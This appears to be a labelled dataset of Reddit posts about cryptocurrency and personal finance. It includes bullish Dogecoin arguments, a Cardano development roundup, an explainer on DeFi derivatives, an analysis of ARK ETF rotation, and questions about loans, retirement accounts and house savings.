- Unlike other coins this is people’s coin backed by peoples trust and emotions, so it could be difficult for technical analysts to wrap their head around the concept and the whole idea. And as far as hard cap is consider do try to search and find Federal Reserves’ balance sheet there is no hard cap there either. 

7)Why are you writing this long of a post? 
- I am holding Dogecoin since June - 2019 and just sharing my experience here, furthermore I cant fix stupid or paperhands, so here trying to give my two cents. 

8) Is this a financial advise? 
-No, This is not a financial advice, do your own diligence before investing. 

9) Why it is dipping? 
- Could be multiple reasons, whole market is going down and some times dips are just discounts to buy more. 

10) Why is your grammar to bad? 
- Cause I invested, my Enc1001 and Enc1002 money in Dogecoin 😂😂 Woof woof 🐶",cryptocurrency

dogecoin,A Macroeconomic Forecast of Dogecoin/Cryptocurrencies,"***Initial Statement of Bias:*** *I own dogecoin and will further provide a bullish forecast throughout the coming years.  Everything stated is my own perspective for the economic outlook of dogecoin.*

The rise in popularity of cryptocurrencies is something thought out of a movie.  A futuristic world that uses digital currency for transactions and investing.  With the rise in this popularity brings the questioning of what efficiencies cryptocurrencies can provide to the market.  The main topics of affected markets are international trade, small businesses and consumers.  Investment in cryptocurrencies in the short term will have an adverse effect on its use as a means of exchanging goods.  

 As with most new currencies, cryptocurrencies are extremely volatile in their current phase.  There will be new cryptocurrencies introduced in the intermediary, but over time the stable currencies will prevail.  Some currency has become reliable enough (i.e., Bitcoin, Litecoin) that consumers have used them for a means of exchange.  Some of the main reasons these currencies have become reliable are:

·  Blockchain: A list of records of transactions made by crypto users.  The list continuously grows as more data strengthens the blockchain.

·  The time in between the release of new currency into the market.  The amount of currency released can be both static and dynamic.  Bitcoin is released every ten minutes, however over time the amount of Bitcoin released declines.  This would be known as a deflationary currency, where the supply of currency is finite and over time the supply dwindles; a deflationary currency would have a dynamic change due to the variability of the amount of currency released. 

·  Dogecoin is an inflationary currency, the amount of coin released is static with no cap on how much coin can be released.  This would combat the effects of inflation and keep an ample amount of currency in circulation over time.  In the long-term, inflationary currencies have proven to last longer than static currencies. (U.S. Dollar switching to a fiat currency system would be an example of an inflationary currency with a third party in control of the interest rates and amount of currency released)

The theory I am developing will work towards proving stable cryptocurrencies can act as a primary means of exchange for consumers with differing amounts in transaction sizes.  These amounts will vary from international businesses to public consumers.  The outcome from this will relieve tension on trade agreements, keep inflation steady, reduce the effect of third parties (Central Banks) manipulating interest rates and injecting currency.",cryptocurrency
CryptoCurrency,"If your money isn't making you money, its losing money. No really, it literally is.","Just a thought I had. Inflation rate of even western countries right now is around 3% or higher. And banks pay interest rates of 1-2% max, though most are 1% or less. So if your cash is just sitting in a bank account, since the rate of inflation is higher than interest, its actually decreasing in value (buying power). So its always a good idea to invest in something (stocks, real estate, crypto). Just remember though, all investments come at a risk and can lose you money as well.",cryptocurrency
personalfinance,Does it matter which loan to pay off?,"I have 3 Stafford student loans, all at the same miserably high interest rate but varied amounts remaining - 8K, 11K and 23K.

personalfinance,Is every last cent of your Roth 401k savings really tax free?,"I'm far from retirement and although I've seen a lot of guides on how to save for retirement, I haven't heard much about how much you actually get once you start to withdraw from your retirement savings account.

This is regarding what someone had written in the comments section in this video: [DR: Should I Put 15% into Company 401k](https://www.youtube.com/watch?v=diNvcU_xWMk):

    Josh Millikan:
    Granted yes your paying taxes on that money but it depends on your withdrawal rate in retirement that will determine what's more costly due to taxes. 

To recap: the guy is comparing outcomes of a Traditional 401k vs. Roth 401k contributions. The Traditional ends up 400k ahead but exactly how much do you get taxed on the amount distributed and does how much you get tax depend on the distribution amount (or is it based off the value of your account)?

I thought at the time of distribution whatever amount you withdraw gets treated like your gross monthly earnings: federal &amp; state taxes apply if your retirement savings was a Traditional 401k. But how does the gvt know how much to withhold in federal taxes since you don't really have an ""annual income""? Do you fit in a tax bracket based on how much you withdraw (so say you withdraw 6000/mo or 72k/yr), would you pay taxes comparable to someone grossing 72k/yr (22%)? If you withdraw 3000/mo, would that instead put you in the 12% tax bracket?

For a Roth 401k, if you withdrew 6000/mo, do you *really* get a direct deposit for that amount (i.e., no fed + state tax applied)?

And what if you wanted to withdraw a larger amount? (Say you wanted to take out 700k to build a house). Can you do that? How is that taxed?",finance

Let's go....

Newly covered today: 

1. Here’s the Cardano Development Status Update for last week. [https://roadmap.cardano.org/en/status-updates/update/2021-04-16/](https://roadmap.cardano.org/en/status-updates/update/2021-04-16/)

3. There is really good information about Cardano’s deals in Africa and its developer adoption strategy in this Cardano Chats interview that kind of flew under the radar. Probably worth a listen if you haven’t heard it. [https://youtu.be/m6TeNLvMTXI](https://youtu.be/m6TeNLvMTXI)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)

9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)

CryptoCurrency,DeFi Explained: Derivatives,"Traditional banking does not offer any attractive interest rates anymore. Some of them even go so far as to have a negative deposit rate. Because of this, It is getting more popular by the day for investors to move their money from their banking account to centralized exchanges to buy stocks or crypto. And then there are investors who take it even further: They invest in DeFi. It is common knowledge to spread your investments in, for example, various stocks, crypto and indices to minimize risks. In case of stocks and indices, this would still require the investor to invest via centralized exchanges. Except… they don’t have to. At least, not anymore.

## Stocks in crypto

The DeFi market is gaining more and more platforms that allow investors to invest in regular stocks such as Tesla, Apple or Google. These products are called synthetic assets and are in fact derivatives. By investing in these products, investors can still trade “shares” of companies via DEXES, and therefore spread investments more widely.

Now, the term derevatives might not ring a bell, and that’s ok. Before we dive into some DeFi platforms that use derivatives, let’s first explain what they are.

## Derivatives

Derivatives are financial products based on an underlying asset, such as shares or commodities. A derivative gives the buyer the right to buy or sell a specific commodity at a specific price. The most well-known derivatives are options, swaps and futures.

These derivatives can have different underlying values, such as a stock, stock index, commodity or currency. They are mainly used to hedge risk or to speculate.

Financial derivatives are traded on the stock exchange, but also between parties. This is called over the counter (OTC). Derivatives owe their popularity to the fact that the contracts are standardized. The products are therefore easy to trade and the liquidity is high.

Because derivatives are available on stock exchanges, it is possible to take a position in the underlying asset through this product, such as a share or a commodity such as oil.

## Types of derivatives

Here is an overview of the most common derivatives you’ll find in centralized exchanges:

* Futures: A future is a forward contract in which the buyer and seller set a price and time at which the underlying financial product is delivered. The traders enter into an obligation by means of a future. Futures are available for financial products such as stock indices and government bonds, as well as physical products such as gold, silver and oil.
* Options: An option is a financial product that gives the buyer of the option the right to buy shares at a predetermined price. In addition, the date on which the right can be exercised has also been determined, the so-called expiry date. The price at which the option is traded is called the option premium.
* CFDs: The abbreviation CFD stands for Contract For Difference. With this product, an investor can easily speculate with leverage on a price rise or fall. With a CFD, the buyer and seller agree to settle the difference in value of the underlying asset from the moment of agreement.
* Swaps: An interest rate swap is a financial product in which two parties exchange interest payments. An interest rate risk can be hedged or an interest position can be taken by means of this derivative. The value of the swap depends on the interest rate.

## Risks of derivatives

In view of the many negative experiences that individuals (and companies) have with financial derivatives, the risks of these products are always emphasized. It is recommended that you read carefully about how a derivative works before you start trading them.

The most important risks are:

* Leverage: Due to the leverage effect, a small price movement in the underlying asset can already cause a large change in the value of the derivative. From a technical point of view, losses can often even be unlimited. On the other hand, it goes without saying that an enormous profit can be made through derivatives.
* Counterparty risk: Counterparty risk is mainly run with an over-the-counter transaction. As a private investor you usually have little to do with this. Nevertheless, it is important to know exactly what the risk entails.

Now, with that out of the way, let’s look at some of the DeFi platforms that support synthetic assets.

## Synthetix

Synthetix is ​​a decentralized protocol for deploying synthetic assets on the Ethereum network. The project also includes the Synthetix.Exchange. The deployment of synthetic assets is done through Ethereum tokens called Synths, which can replicate the value of cryptocurrencies such as Bitcoin or Ether. The value can also be replicated of more traditional stocks such as Apple shares (AAPL). The protocol uses its own Ethereum token, SNX, to ensure the proper functioning of its services. SNX is thus used as a guarantee for the stability and liquidity of the various Synths offered to the users.

The difference between Synths and “regular” tokens is that their value fluctuates in relation to the underlying asset they replicate. To take a simple example: sBTC will have a similar value to traditional BTC. This allows the investor to take advantage of the fluctuations of the underlying assets without having to own them directly.

The following Synths are available:

* Cryptocurrencies such as BTC, ETH and BNB.
* Fiat currensies such as USD, EURO and JPY
* Stockindices such as gold- and silverindices.
* Inverse Synths, such as inverse Bitcoin.

## UMA

UMA, short for Universal Market Access, is an Ethereum-based protocol that allows users to create custom synthetic tokens that can track the price of just about anything. To be more specific, UMA allows you to trade any asset with ERC-20 tokens without any real exposure to the asset itself. This allows anyone to access assets that would otherwise be out of their reach. The UMA token is used for protocol management and price oracle.

Since an investor can use almost any asset as collateral with UMA, you can use, for example, cUSDC. cUSDC is received after depositing USDC into Compound. In this example, cUSDC accrues the interest from the initial USDC deposit. With this token, it is then possible to create a synthetic token. This synthetic token can represent, for example, the price of gold. This token not only tracks the price of gold, but also earns 10% interest per year through the USDC that is locked.

## Final words

The DeFi derivatives market is growing. Thanks to platforms like UMA and Synthetix, it is now possible for investors to invest in synthetic assets, which would normally only be possible via CeFi. It is therefore expected that derivatives platforms are going to play a major role in future derivative investing.

personalfinance,Open for feedback on how I'm doing?,"Hi Reddit, first-time poster here. I have become increasingly invested in my finances and figuring out how to optimize my wealth. I am a married 28F, with some debt and was wondering if I could get input on how to prioritize my money? I will list my current monthly bills and outstanding debts.

Rent: $750 (my half)

Car: $234 ($2,700 left remaining on this loan at 5.4%)

Credit cards: $11k, both ccs have 0% APR and I have a payment plan to pay one of them off without ever paying interest. The second card will only have $2,300 once my 0% APR contract is up. 

Student loans: $35,800 outstanding. One is LendKey at $183 a month (5.4%, $11,889 remaining), the other loans are Fedloan, currently at 0% interest with no required monthly payments. I just put an additional $1,700 towards my LendKey tonight from tuition reimbursement through my work. 

Currently, I have a 403b I am contributing to the max match, it has a balance of $31.8k.  

I just recently opened a Vanguard Roth IRA and only have $228, invested in VTI. I plan to contribute to this monthly but wasn't sure exactly how much I should be.

Lastly, I have a tiny amount between stock and crypto just for fun really. $430

We do not currently have an emergency fund and I know that needs to be a priority of ours to grow.

My question is - are we doing okay? I am really fired up over the fi/re community and want to do everything I can to set myself up for the future. I am making strides to increase my net worth but was looking for some guidance if anyone thinks I need any. Do I open an HSA? Do I pay off my credit card debt regardless of the 0% APR? How much should I contribute to my Roth IRA? TIA.",finance

CryptoCurrency,Nothing wrong in reserving some seat in Doge train - Also Debunking all the myths about Doge,"Some said that the DOGE crash is gonna be epic. But in reality DOGE is doing much better even in today's flash crash. So do you still think the DOGE's crash gonna be epic? It might go up and down a bit and consolidate but eventually it is destined for much higher value. Think again. It is poor man's bitcoin and a second chance to people who missed bitcoin. This is not my statement. This is the mindset of majority people. It is getting enough publicity and popularity to become silver to gold (Bitcoin). There is nothing wrong in reserving some seat in Doge train.Debunking almost all the myths about Doge:  


1. **It has unlimited supply** \- No, it doesn't have unlimited supply. It has controlled supply of approximately 5 billion doge per year. So it takes 20 years for the supply to double. And the inflation percentage keeps going lower and lower every year. Even bitcoin is going to have inflation for next 120 years which is beyond our lifetime. So if you consider our lifetime, Doge's inflation is not a big deal.
2. **Still not convinced** \- Fair. Let me tell you that Doge's continuous supply is by choice. No body forced Doge to have continuous supply. And because of this continuous supply Doge gave continuous incentive to miners and so it has survived multiple bear markets while many other coins have died. Check 42coin which has only 42 coins and scarcest but it has bitten dust. So just supply argument is meaningless. You should consider both demand and supply and DOGE is going to have more demand than its supply and it is continue to rise.
3. **USD inflation is \~3% but DOGE inflation is 4%. So, it is worse than USD. -** This is incorrect. USD inflation is calculated using consumer price index (prices of various daily needs) and not based on how many more USD is printed in a year. So this is not apples to apples comparison. If you compute USD inflation in the same way, it will be much higher (may be 30% last year because FED went brrrrr). And if you compute DOGE inflation in current USD method, then it is deflationary so far because you now get more stuff with less DOGE.
4. **But I still can't accept it. -** Remember that the community decides about its supply. Not the doge developers. It is open source and anyone can go any make required changes. So if entire community decides that it's supply should be limited then it will be limited. It is currently this way because it is good for DOGE this way, at least for now. It can be changed in future given that we get consensus.
5. **It is a pump and dump coin** \- When you look at DOGE/BTC chart it looks like pump and dump but it doesn't look the same way with DOGE/USD chart. In fact, so many other coins look like pump and dump when look at BTC pair chart because BTC has performed enormously well historically. If you want to see real pump and dump then look at this chart. [https://coinmarketcap.com/currencies/chaincoin/](https://coinmarketcap.com/currencies/chaincoin/?fbclid=IwAR1yPdIM_jHqIKjQeYBGUeu0sZdUvFLqW5XQNUdDZ67Zyvp16HdKF0D_QJM). Usually pump and dumps coins pump once/twice and die after that. DOGE is pretty much at all time high now which is a proof that it is not exactly pump and dump. It is more like Bitcoin in its early days.
6. **There is no active development and there are no developers.** \- There are a few developers working on bug fixes. If this grows like BTC, definitely more developers will join. Remember this is open source project and billionaires are invested in it. They can easily offer bounties for developers to make required improvements. If you think realistically, then this is not at all a problem. It has been running fine for 7 years and continue to run fine.
7. **But as Charles (of Cardano) told, what if it needs emergency fix? -** Decentralized systems must not require emergency fixes like Charles described. It defeats the whole purpose of decentralization. If you think this is an issue, you are still thinking with centralization mindset.
8. **But it has no utility.** It is not a utility token like Chainlink or BNB. It is a currency like Bitcoin. It is created to use as currency and is being used as currency. Discarding it as not having utility is meaningless. If you still think it needs to have a utility, then you are still thinking with the mindset of centralized systems and stock market. Not like a real decentralized crypto mindset.
9. **Its own creator did not believe in it and left the project long back.** Again realize that decentralized projects do not belong to anyone. They belong to whole community. Even Bitcoin's creator is not active anymore. This is actually good than any bad. It is people who decide the fate of a decentralized project, not a foundation or its creator. In this sense, it is much much better than many projects which claim they have real world use case.
10. **But it is damaging the reputation of whole Crypto industry.** No it is not. It is in fact reminding everyone what crypto is about. The real decentralized crypto should be like DOGe and not be like Chainlink or Vechain which needs continuous maintenance from the respective teams. They can even be controlled by governments whereas Doge gives complete freedom. I am not against Chainlink/Vechain and even hold some of them as they are providing value but just want to compare with them and show the difference between real crypto and pseudo crypto.
11. **And finally it is just a meme coin**. Though it is a meme coin, technically it is same as other bitcoin and litecoin which are other currencies. And regarding supply, see my first three myth debunks. And many people agree that it's meme status is its biggest strength. My word finally is, there are many joke coins pretending to be serious, while DOGE is a serious coin pretending to be a joke. Miss DOGE at your own risk.

CryptoCurrency,"US Treasury bringing charges against Financial Institutions for Cryptocurrency Laundering is most probably FUD: Treasury doesnt bring money laundering charges, DOJ does.","There is some news floating around with unnamed ""sources"" that US Treasury is going to bring charges for cryptocurrency laundering. The article seems to be from dubious websites and doesnt quote any sources.

Here is why its fishy and most likely FUD:

1. DOJ brings money laundering charges. Treasury doesnt. Money laundering is a crime. Treasury manages federal finances, currency etc. DOJ is the organisation that pursues money laundering by financial institutions. 

2. Investigations of these kind are kept strictly confidential and rarely leak especially to random websites and twitter accounts. They are announced usually with arrests, official confirmation of investigations on the DOJ website (Similar to how Bitmex takedown was announced). Its extremely suspicious that some thing of this magnitude, a federal investigation gets out through the media. 

Considering the news is being spread by twitter account, it looks like FUD created to crash the market on a lazy Sunday, after weeks of going up and a breather after the anticipated Coinbase listing.",cryptocurrency

personalfinance,"TSP Contributions, Roth IRA strategy","Hello everyone, 

  
I make close to 6 figures, mid-20s, and have a stable government job with minimal expenses. I max out my contributions to the federal TSP program, which is 19.5k per year.  My TSP split 70 in big cap (C), 20% in medium/small cap (S) and 10% I (international). 

I have about 50k in savings, split between two banking accounts and a brokerage account. I intend to buy a rental property in my hometown once the market cools down, so a purchase in perhaps the next 3-5 years. Otherwise, no other investments tying me down. 

I know you can't time the market, but part of me cringes at investing at all-time high. Still, goal is to at least be able to park a significant portion of my savings, with the goal of being able to tap it for a bigger purchase (rental propertie(s) )  in the coming years. 

Should I open a Roth IRA and max my yearly contribution now? If so, would you all recommend a strategy similar to my TSP (S&amp;P 500 heavy), or a more aggressive one with more small/medium cap funds?

stocks,Analyzing Cathie Wood's (ARK) strategy in a correction and a lesson on systematic and unsystematic risks,"Most of you have probably heard of Cathie Wood, or own one or more of her ETFs. ARK ETFs have won prizes in the past 2 years for the Active ETF of the year (ARKK), and most innovative ETF (ARKG). While having had an amazing 2020, with most ARK ETFs gaining 300%+ in value, in the past 2/3 months the ETFs have underperformed the market (-0.09% YTD for ARKK vs 11.92% YTD for the S&amp;P 500 Total Return, and -4.89% YTD for ARKG vs 10.27% YTD for the MSCI World Net total return^(1)) seeing drops of 20%+. This is due to a quick rise in interest rates, initiating a mostly institutional rotation to value stocks, as growth stocks their valuations come down more compared to value stocks due to an increase of the discount rate for future earnings as one of the most important reasons. This valuation-reset is in my opinion very justified.

First, let’s look at the financial theory of classification of risk. Investment risks affecting the valuation of asset values can be categorized in two types of risk. **Systematic** and **Unsystematic risk**. 

**Systematic risks**, also known as market risks, are risks that can affect an entire economic market overall or a large percentage of the total market. Market risk is the risk of losing investments due to factors, such as political risk and macroeconomic risk, that affect the performance of the overall market. Market risk cannot be easily mitigated through portfolio diversification. Other common types of systematic risk can include interest rate risk, inflation risk, currency risk, liquidity risk, country risk, and sociopolitical risk. The way the sensitivity to systematic risk is measured, is by looking at the beta coefficient. The beta coefficient can measure the volatility of an individual stock compared to the systematic risk of the entire market. In statistical terms, beta represents the slope of the line through a regression of data points. In finance, each of these data points represents an individual stock's returns against those of the market as a whole (Thus, the market has a beta of 1. &gt; 1 = more sensitive to systematic risk than the average of the total market, 0 &gt; β &lt; 1 = less sensitive to systematic risk than the average of the total market. **Beta effectively describes the activity of a security's returns as it responds to swings in the market.** 

**Unsystematic risk**, also known as specific risk or idiosyncratic risk, is a category of risk that only affects an industry or a particular company. Unsystematic risk is the risk of losing an investment due to company or industry-specific hazard. Examples include a change in management, a product recall, a regulatory change that could drive down company sales, and a new competitor in the marketplace with the potential to take away market share from a company. Investors often use diversification to manage unsystematic risk by investing in a variety of assets.

However, what is ARK’s / Cathie’s strategy in these volatile times? Let’s take a look at this interview of Cathie Wood with CNBC on the 17th of Februari, 2021: Click [here](https://www.youtube.com/watch?v=atjQcRXX-NI) (Time: 5.34 – 8.30)

She gets asked whether she holds any cash in case a valuation reset happens. Her answer is very interesting: “*We use it”.* Now, how does an ETF like ARK actually make use of short-term volatility due to systematic risk? 

“The last 6 months we have been expanding the number of names in our portfolio, as a bull market extends. In some ways it’s a tax efficient strategy. What we will do during a severe correction, like the corona virus crisis presented, we will *sell names which are creating losses now, to buy our highest conviction names*. Some of the names we have been moving into are the bigger biotech names, Regeneron, Novartis, Takeda. *We think of them as cash like. We’re using them as cash-like instruments in some way, because we will move back into our pure play names when we get into a severe correction. We use corrections toggling back and forth. Right now, our flagship portfolio has roughly 52 names in it, at the low point in the corona virus last year it was as low as 33 I believe.”*

Now, ARK ETFs consists of portfolios of many highly speculative stocks. Some of them without even having earnings, some of them with small market caps, negative cash flows etc. I’m not saying this is necessarily a bad thing, yet most stocks in their portfolios are volatile stocks with high beta’s, which means they are very sensitive to systematic risks. ARKK has a beta of 1.65, ARKG has a beta of 1.63 and ARKF has a beta of 1.23 (and thus got hit less compared to ARKG and ARKK by the market volatility of the past few months). 

So how does she toggle back and forth? When she expects a correction is coming soon, she sells many of her positions in smaller companies that are very sensitive to market risk and invests that money into bigger names that have lower beta’s. She called a few big biotech names already, such as Regeneron (β = .19), Novartis(β =  .51) and Takeda(β =  1.17), yet she also did this with PayPal (β =  1.15), Lockheed Martin (β = .98), TSMC (β = 1.00) and many others (which are all relatively low beta compared to other companies in their funds). 

Theoretically, let’s say that due to systematic risk, an entire sector drops 10%. Stocks with a beta of 2 (*her pure play stocks*) would go down (2 x 10%) 20%, while stocks with a beta of .5 (*deep value stocks*) would only go down (.5 x 10%) 5%. She sees these stable companies as *“cash-like instruments”,* or *deep value* stocks. These deep value stocks are large, established companies, which she believes has a positive future ahead anyway, yet for the long term does not deliver attractive enough growth compared to what she wants to achieve in her fund.

Now that the correction happened and when a recovery is expected, she sells these deep value stocks for only a 5% loss. She then buys her *“pure play stocks”* with this money, which went down 20%. Doing this, she is effectively buying back her stocks that she sold earlier at a cheaper price. Obviously this is purely theoretical, yet you can see the application of this strategy as well. Now, this only works if she is able to time a correction in the market relatively well. If she is too far off, the pure play stocks could already have grown so much that the stock price after a 20% correction would still be above the price that she could've bought in earlier. 

[Here](https://cathiesark.com/) you can graphically see the holdings of ARK funds over time. It’s clear that she is selling shares (not just normal ETF rebalancing). For example, look at the graph of PYPL, TSM, REGN and AMZN. You can see she has been selling them when the markets went down in the end of February and March. She then moved that money into her pure plays that dropped more heavily, such as TDOC and FATE.

But theory isn't practice. TDOC does not have a high beta, while FATE does. What they both have in common though, is that they all went down very hard in February / March. It also does not have to be just because of a market wide correction. For example, Cathie has been buying lots of U after the drop in February, which was the consequence of a financial report indicating growth that did not meet the expectations of investor. 

So why does she not just hold cash?  
Funds are usually not allowed and or incentivized to hold large amounts of cash, and neither would that be efficient. Trying to exactly time the market usually does not work out. By being in the market (albeit with less risky plays) you still get a return on your investment. This is more of a hedge in her portfolio against a correction.

Do I recommend this tactic for the average investor?   
No, timing the market is very difficult, and even big institutions struggle with this. However, it is good to understand the strategy behind these plays. You could however always adopt such a strategy by allocating a certain amount of cash to a relatively safe company in the same sector, using it in the way I outlined above. There are obviously risks, such as not timing the correction well enough, and the risk of the ""deep value"" stocks dropping. However, i believe that everyone should hold a small percentage of their portfolio in cash on the sideline, if a severe correction happens (like last year).

In the end, even though theory does not match practice perfectly, we can definitely see the theoretical reasoning behind her strategy. The more general takeaway is that she uses these *deep value* stocks as a hedge against a correction, while still generating a return on investment. She then uses the cash to buy stocks she believes in long term which went down due to short term price fluctuations, whether due to systematic risk or unsystematic risk, depending on the company itself.

^(1) I know comparing a genomics ETF to a total world benchmark, and an innovation fund to the S&amp;P 500 returns is not fair, yet it’s more of an example to show the underperformance of these sectors as the effects of the rising interest rates hit these sectors comparatively harder than others (of which some underperformed last year for example)

personalfinance,Is a Five-Year CD with 1% APY Worth It to Save Up for a Downpayment on a House?,"I'm in my mid-30s and currently moved back with my parents to help pay off student loan debt, and I'm almost done. I live in a high COL area, and only make 50K a year. I work for a public university, and there are barely any job promotions unless you apply for another job at the university. Where I live, a 50k salary is slightly below the average at 60k/year. 

It's hard to make 100k in my field (political science) here, so I'm applying for jobs in the DC area, but obviously the cost of living and taxes are even higher. I've been trying to save up for a house, but have only 18k in savings. Where I live right now the housing market is insanely hot and property is usually snatched up in days. Many people are paying for the homes in cash. The average house here now goes for $500,000, but our wages are very low (this is in Florida). We have a lot of out-of-towners moving down here and buying. 

